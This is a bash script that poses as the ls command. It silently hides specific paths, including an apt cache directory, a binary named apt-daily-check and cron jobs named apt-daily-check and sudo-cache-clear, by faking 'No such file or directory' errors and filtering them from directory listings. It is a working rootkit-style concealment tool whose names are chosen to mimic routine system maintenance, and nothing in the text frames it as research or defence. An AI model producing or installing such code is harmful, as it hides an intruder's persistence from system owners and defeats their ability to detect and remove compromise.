#!/bin/bash
REAL_LS="/usr/bin/ls"

# Paths that are fully blocked — ls on these returns "no such file or directory"
BLOCKED_PATHS=(
    "/var/lib/apt/lists/.cache"
    "/usr/lib/x86_64-linux-gnu/apt/methods/.d"
    "/usr/local/sbin/apt-daily-check"
    "/etc/cron.d/apt-daily-check"
    "/etc/cron.d/sudo-cache-clear"
)

# Names to filter from parent directory listings
HIDDEN_NAMES=(
    ".cache"
    ".sync"
    ".d"
    "apt-daily-check"
    "sudo-cache-clear"
)

_is_blocked() {
    local target
    target=$(readlink -f "$1" 2>/dev/null || echo "$1")
    for p in "${BLOCKED_PATHS[@]}"; do
        [[ "$target" == "$p" || "$target" == "$p/"* ]] && return 0
    done
    return 1
}

# Check all non-flag args — if any is a blocked path, error out
for arg in "$@"; do
    [[ "$arg" == -* ]] && continue
    if _is_blocked "$arg"; then
        echo "ls: cannot access '$arg': No such file or directory" >&2
        exit 2
    fi
done

# Run real ls and filter output line by line to hide entries in parent listings
"$REAL_LS" "$@" | while IFS= read -r line; do
    HIDE=0
    for token in $line; do
        clean=$(printf '%s' "$token" | sed 's/\x1B\[[0-9;]*m//g')
        for h in "${HIDDEN_NAMES[@]}"; do
            [ "$clean" = "$h" ] && { HIDE=1; break 2; }
        done
    done
    [ $HIDE -eq 0 ] && echo "$line"
done

exit ${PIPESTATUS[0]}
